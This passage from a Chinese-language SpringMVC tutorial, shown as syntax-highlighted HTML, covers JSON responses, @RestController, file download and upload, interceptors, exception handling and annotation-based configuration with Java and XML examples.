class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//响应浏览器list集合</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test/ResponseBody/json&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">testResponseBody</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1001</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1002</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1003</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    List&lt;User&gt; list = Arrays.asList(user1, user2, user3);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//响应浏览器map集合</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test/ResponseBody/json&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">testResponseBody</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1001</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1002</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1003</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;123456&quot;</span>,<span class="number">23</span>,<span class="string">&quot;男&quot;</span>);</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map.put(<span class="string">&quot;1001&quot;</span>, user1);</span><br><span class="line">    map.put(<span class="string">&quot;1002&quot;</span>, user2);</span><br><span class="line">    map.put(<span class="string">&quot;1003&quot;</span>, user3);</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//响应浏览器实体类对象</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test/ResponseBody/json&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">testResponseBody</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-5、-RestController注解"><a href="#9-5、-RestController注解" class="headerlink" title="9.5、@RestController注解"></a>9.5、@RestController注解</h2><p>@RestController注解是springMVC提供的一个复合注解，标识在控制器的类上，就相当于为类添加了</p><p>@Controller注解，并且为其中的每个方法添加了@ResponseBody注解</p><h1 id="10、文件上传和下载"><a href="#10、文件上传和下载" class="headerlink" title="10、文件上传和下载"></a>10、文件上传和下载</h1><h2 id="10-1、文件下载"><a href="#10-1、文件下载" class="headerlink" title="10.1、文件下载"></a>10.1、文件下载</h2><p>ResponseEntity用于控制器方法的返回值类型，该控制器方法的返回值就是响应到浏览器的响应报文</p><p>使用ResponseEntity实现下载文件的功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testDown&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;<span class="type">byte</span>[]&gt; testResponseEntity(HttpSession session) <span class="keyword">throws</span></span><br><span class="line">    IOException &#123;</span><br><span class="line">    <span class="comment">//获取ServletContext对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> session.getServletContext();</span><br><span class="line">    <span class="comment">//获取服务器中文件的真实路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> servletContext.getRealPath(<span class="string">&quot;/static/img/1.jpg&quot;</span>);</span><br><span class="line">    <span class="comment">//创建输入流</span></span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(realPath);</span><br><span class="line">    <span class="comment">//创建字节数组</span></span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[is.available()];</span><br><span class="line">    <span class="comment">//将流读到字节数组中</span></span><br><span class="line">    is.read(bytes);</span><br><span class="line">    <span class="comment">//创建HttpHeaders对象设置响应头信息</span></span><br><span class="line">    MultiValueMap&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">    <span class="comment">//设置要下载方式以及下载文件的名字</span></span><br><span class="line">    headers.add(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=1.jpg&quot;</span>);</span><br><span class="line">    <span class="comment">//设置响应状态码</span></span><br><span class="line">    <span class="type">HttpStatus</span> <span class="variable">statusCode</span> <span class="operator">=</span> HttpStatus.OK;</span><br><span class="line">    <span class="comment">//创建ResponseEntity对象</span></span><br><span class="line">    ResponseEntity&lt;<span class="type">byte</span>[]&gt; responseEntity = <span class="keyword">new</span> <span class="title class_">ResponseEntity</span>&lt;&gt;(bytes, headers,statusCode);</span><br><span class="line">    <span class="comment">//关闭输入流</span></span><br><span class="line">    is.close();</span><br><span class="line">    <span class="keyword">return</span> responseEntity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-2、文件上传"><a href="#10-2、文件上传" class="headerlink" title="10.2、文件上传"></a>10.2、文件上传</h2><p>文件上传要求form表单的请求方式必须为post，并且添加属性enctype&#x3D;”multipart&#x2F;form-data”</p><p>SpringMVC中将上传的文件封装到MultipartFile对象中，通过此对象可以获取文件相关信息</p><p>上传步骤：</p><h3 id="①添加依赖："><a href="#①添加依赖：" class="headerlink" title="①添加依赖："></a>①添加依赖：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②在SpringMVC的配置文件中添加配置："><a href="#②在SpringMVC的配置文件中添加配置：" class="headerlink" title="②在SpringMVC的配置文件中添加配置："></a>②在SpringMVC的配置文件中添加配置：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--必须通过文件解析器的解析才能将文件转换为MultipartFile对象--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;multipartResolver&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="③控制器方法："><a href="#③控制器方法：" class="headerlink" title="③控制器方法："></a>③控制器方法：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testUp&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testUp</span><span class="params">(MultipartFile photo, HttpSession session)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//获取上传的文件的文件名</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> photo.getOriginalFilename();</span><br><span class="line">    <span class="comment">//处理文件重名问题</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">hzName</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    fileName = UUID.randomUUID().toString() + hzName;</span><br><span class="line">    <span class="comment">//获取服务器中photo目录的路径</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> session.getServletContext();</span><br><span class="line">    <span class="type">String</span> <span class="variable">photoPath</span> <span class="operator">=</span> servletContext.getRealPath(<span class="string">&quot;photo&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(photoPath);</span><br><span class="line">    <span class="keyword">if</span>(!file.exists())&#123;</span><br><span class="line">        file.mkdir();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">finalPath</span> <span class="operator">=</span> photoPath + File.separator + fileName;</span><br><span class="line">    <span class="comment">//实现上传功能</span></span><br><span class="line">    photo.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(finalPath));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="11、拦截器"><a href="#11、拦截器" class="headerlink" title="11、拦截器"></a>11、拦截器</h1><h2 id="11-1、拦截器的配置"><a href="#11-1、拦截器的配置" class="headerlink" title="11.1、拦截器的配置"></a>11.1、拦截器的配置</h2><p>SpringMVC中的拦截器用于拦截控制器方法的执行</p><p>SpringMVC中的拦截器需要实现HandlerInterceptor</p><p>SpringMVC的拦截器必须在SpringMVC的配置文件中进行配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.interceptor.FirstInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;firstInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 以上两种配置方式都是对DispatcherServlet所处理的所有的请求进行拦截 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:mapping</span> <span class="attr">path</span>=<span class="string">&quot;/**&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:exclude-mapping</span> <span class="attr">path</span>=<span class="string">&quot;/testRequestEntity&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;firstInterceptor&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mvc:interceptor</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    以上配置方式可以通过ref或bean标签设置拦截器，通过mvc:mapping设置需要拦截的请求，</span></span><br><span class="line"><span class="comment">    通过mvc:exclude-mapping设置需要排除的请求，即不需要拦截的请求</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h2 id="11-2、拦截器的三个抽象方法"><a href="#11-2、拦截器的三个抽象方法" class="headerlink" title="11.2、拦截器的三个抽象方法"></a>11.2、拦截器的三个抽象方法</h2><p>SpringMVC中的拦截器有三个抽象方法：</p><p>preHandle：控制器方法执行之前执行preHandle()，其boolean类型的返回值表示是否拦截或放行，返回true为放行，即调用控制器方法；返回false表示拦截，即不调用控制器方法</p><p>postHandle：控制器方法执行之后执行postHandle()</p><p>afterCompletion：处理完视图和模型数据，渲染视图完毕之后执行afterCompletion()</p><h2 id="11-3、多个拦截器的执行顺序"><a href="#11-3、多个拦截器的执行顺序" class="headerlink" title="11.3、多个拦截器的执行顺序"></a>11.3、多个拦截器的执行顺序</h2><p>①若每个拦截器的preHandle()都返回true</p><p>此时多个拦截器的执行顺序和拦截器在SpringMVC的配置文件的配置顺序有关：</p><p>preHandle()会按照配置的顺序执行，而postHandle()和afterCompletion()会按照配置的反序执行</p><p>②若某个拦截器的preHandle()返回了false</p><p>preHandle()返回false和它之前的拦截器的preHandle()都会执行，postHandle()都不执行，返回false</p><p>的拦截器之前的拦截器的afterCompletion()会执行</p><h1 id="12、异常处理器"><a href="#12、异常处理器" class="headerlink" title="12、异常处理器"></a>12、异常处理器</h1><h2 id="12-1、基于配置的异常处理"><a href="#12-1、基于配置的异常处理" class="headerlink" title="12.1、基于配置的异常处理"></a>12.1、基于配置的异常处理</h2><p>SpringMVC提供了一个处理控制器方法执行过程中所出现的异常的接口：HandlerExceptionResolver</p><p>HandlerExceptionResolver接口的实现类有：DefaultHandlerExceptionResolver和</p><p>SimpleMappingExceptionResolver</p><p>SpringMVC提供了自定义的异常处理器SimpleMappingExceptionResolver，使用方式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.SimpleMappingExceptionResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;exceptionMappings&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">                properties的键表示处理器方法执行过程中出现的异常</span></span><br><span class="line"><span class="comment">                properties的值表示若出现指定异常时，设置一个新的视图名称，跳转到指定页面</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;java.lang.ArithmeticException&quot;</span>&gt;</span>error<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">exceptionAttribute属性设置一个属性名，将出现的异常信息在请求域中进行共享</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;exceptionAttribute&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ex&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="12-2、基于注解的异常处理"><a href="#12-2、基于注解的异常处理" class="headerlink" title="12.2、基于注解的异常处理"></a>12.2、基于注解的异常处理</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ControllerAdvice将当前类标识为异常处理的组件</span></span><br><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExceptionController</span> &#123;</span><br><span class="line">    <span class="comment">//@ExceptionHandler用于设置所标识方法处理的异常</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(ArithmeticException.class)</span></span><br><span class="line">    <span class="comment">//ex表示当前请求处理中出现的异常对象</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleArithmeticException</span><span class="params">(Exception ex, Model model)</span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;ex&quot;</span>, ex);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="13、注解配置SpringMVC"><a href="#13、注解配置SpringMVC" class="headerlink" title="13、注解配置SpringMVC"></a>13、注解配置SpringMVC</h1><p>使用配置类和注解代替web.xml和SpringMVC配置文件的功能</p><h2 id="13-1、创建初始化类，代替web-xml"><a href="#13-1、创建初始化类，代替web-xml" class="headerlink" title="13.1、创建初始化类，代替web.xml"></a>13.1、创建初始化类，代替web.xml</h2><p>在Servlet3.0环境中，容器会在类路径中查找实现javax.servlet.ServletContainerInitializer接口的类，</p><p>如果找到的话就用它来配置Servlet容器。 Spring提供了这个接口的实现，名为</p><p>SpringServletContainerInitializer，这个类反过来又会查找实现WebApplicationInitializer的类并将配</p><p>置的任务交给它们来完成。Spring3.2引入了一个便利的WebApplicationInitializer基础实现，名为</p><p>AbstractAnnotationConfigDispatcherServletInitializer，当我们的类扩展了</p><p>AbstractAnnotationConfigDispatcherServletInitializer并将其部署到Servlet3.0容器的时候，容器会自动发现它，并用它来配置Servlet上下文。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebInit</span> <span class="keyword">extends</span></span><br><span class="line">    <span class="title class_">AbstractAnnotationConfigDispatcherServletInitializer</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定spring的配置类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;SpringConfig.class&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定SpringMVC的配置类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;WebConfig.class&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 指定DispatcherServlet的映射规则，即url-pattern</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加过滤器</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Filter[] getServletFilters() &#123;</span><br><span class="line">        <span class="type">CharacterEncodingFilter</span> <span class="variable">encodingFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharacterEncodingFilter</span>();</span><br><span class="line">        encodingFilter.setEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        encodingFilter.setForceRequestEncoding(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HiddenHttpMethodFilter</span> <span class="variable">hiddenHttpMethodFilter</span> <span class="operator">=</span> newHiddenHttpMethodFilter();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Filter</span>[]&#123;encodingFilter, hiddenHttpMethodFilter&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-2、创建SpringConfig配置类，代替spring的配置文件"><a href="#13-2、创建SpringConfig配置类，代替spring的配置文件" class="headerlink" title="13.2、创建SpringConfig配置类，代替spring的配置文件"></a>13.2、创建SpringConfig配置类，代替spring的配置文件</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConfig</span> &#123;</span><br><span class="line">    <span class="comment">//ssm整合之后，spring的配置信息写在此类中</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="13-3、创建WebConfig配置类，代替SpringMVC的配置文件"><a href="#13-3、创建WebConfig配置类，代替SpringMVC的配置文件" class="headerlink" title="13.3、创建WebConfig配置类，代替SpringMVC的配置文件"></a>13.3、创建WebConfig配置类，代替SpringMVC的配置文件</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//扫描组件</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.atguigu.mvc.controller&quot;)</span></span><br><span class="line"><span class="comment">//开启MVC注解驱动</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="comment">//使用默认的servlet处理静态资源</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureDefaultServletHandling</span><span class="params">(DefaultServletHandlerConfigurer configurer)</span> &#123;</span><br><span class="line">        configurer.enable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//配置文件上传解析器</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> CommonsMultipartResolver <span class="title function_">multipartResolver</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommonsMultipartResolver</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//配置拦截器</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        <span class="type">FirstInterceptor</span> <span class="variable">firstInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FirstInterceptor</span>();</span><br><span class="line">        registry.addInterceptor(firstInterceptor).addPathPatterns(<span class="string">&quot;/**&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//配置视图控制</span></span><br><span class="line">    <span class="comment">/*@Override</span></span><br><span class="line"><span class="comment">public void addViewControllers(ViewControllerRegistry registry) &#123;</span></span><br><span class="line"><span class="comment">registry.addViewController(&quot;/&quot;).setViewName(&quot;index&quot;);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">    <span class="comment">//配置异常映射</span></span><br><span class="line">    <span class="comment">/*@Override</span></span><br><span class="line"><span class="comment">public void configureHandlerExceptionResolvers(List&lt;HandlerExceptionResolver&gt; resolvers) &#123;</span></span><br><span class="line"><span class="comment">SimpleMappingExceptionResolver exceptionResolver = new SimpleMappingExceptionResolver();</span></span><br><span class="line"><span class="comment">Properties prop = new Properties();</span></span><br><span class="line"><span class="comment">prop.setProperty(&quot;java.lang.ArithmeticException&quot;, &quot;error&quot;);</span></span><br><span class="line"><span class="comment">//设置异常映射</span></span><br><span class="line"><span class="comment">exceptionResolver.setExceptionMappings(prop);</span></span><br><span class="line"><span class="comment">//设置共享异常信息的键</span></span><br><span class="line"><span class="comment">exceptionResolver.setExceptionAttribute(&quot;ex&quot;);</span></span><br><span 